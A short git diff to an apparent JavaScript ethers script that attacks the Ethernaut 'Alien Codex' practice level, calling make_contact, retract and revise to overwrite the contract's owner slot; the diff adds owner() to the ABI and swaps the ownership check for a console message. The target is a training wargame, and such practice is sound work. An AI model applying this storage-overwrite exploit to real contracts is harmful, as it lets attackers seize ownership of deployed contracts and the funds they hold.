@@ -17,6 +17,7 @@ const attackAlienCodex = async () => {
         "function make_contact()",
         "function retract()",
         "function revise(uint i, bytes32 _content)",
+        "function owner()",
     ];
     const contract = await ethers.getContractAt(ABI, alienCodexAddress);
     const tx1 = await contract.make_contact();
@@ -41,8 +42,14 @@ const attackAlienCodex = async () => {
     const tx3 = await contract.revise(i, _content);
     const tx3Receipt = await tx3.wait(1);
     console.log(tx3Receipt);
-    const pass = (await contract.owner) === playerAddress;
-    console.log(`Claimed ownership and passed this level: ${pass}`);
+    // const own = await contract.owner();
+    // const owner = await own.wait(1);
+    // console.log(owner);
+    // const pass = (await contract.owner()) === playerAddress;
+    // console.log(`Claimed ownership and passed this level: ${pass}`);
+    console.log(
+        "Attack done, check if you claimed ownership by typing 'await contract.owner() === player' on ethernaut console, it will show true if you suceed"
+    );
 };
 
 attackAlienCodex()
